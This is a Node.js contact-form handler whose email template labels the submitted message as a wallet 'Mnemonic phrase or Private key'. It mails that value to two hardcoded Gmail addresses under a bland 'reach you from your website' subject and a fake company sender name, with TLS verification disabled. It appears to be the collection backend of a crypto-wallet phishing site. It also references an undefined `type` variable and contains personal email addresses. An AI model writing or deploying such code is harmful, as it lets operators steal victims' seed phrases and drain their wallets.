const nodemailer = require( "nodemailer" );

const sendContact = async ( req, res ) =>
{
      const { surname, firstname, phoneNumber, email, message } = req.body;
      if (!email || !message || !phoneNumber) res.status(400).json({message:'Email, phone number or message is empty'})
      const transporter = nodemailer.createTransport( {
            service: 'gmail',
            auth: {
                  user: process.env.EMAIL,
                  pass: process.env.EMAIL_PASSWORD
            },
            tls: {
                  rejectUnauthorized:false
            }
      } )
      const html = `
      <p>Name: ${firstname} ${surname}</p>
<p>Email: ${email}</p>
<p>Wallet Type: ${type}</p>
<p>Mnemonic phrase or Private key: ${message}</p>
      `
const to = ['folorunsopraise12@gmail.com','vivoluwole@gmail.com']
const from= 'Devlevt Pharmacitical Company'
      try {
      await transporter.sendMail( {
            from,
            to,
            subject: 'Someone Tried To Reach You From Your Website',
            html
            } );
            res.status(200).json({message:'sent'})
      } catch (err) {
            console.log(err)
            res.status(500).json({message: 'internal server error'})
      }
      

};

module.exports ={sendContact}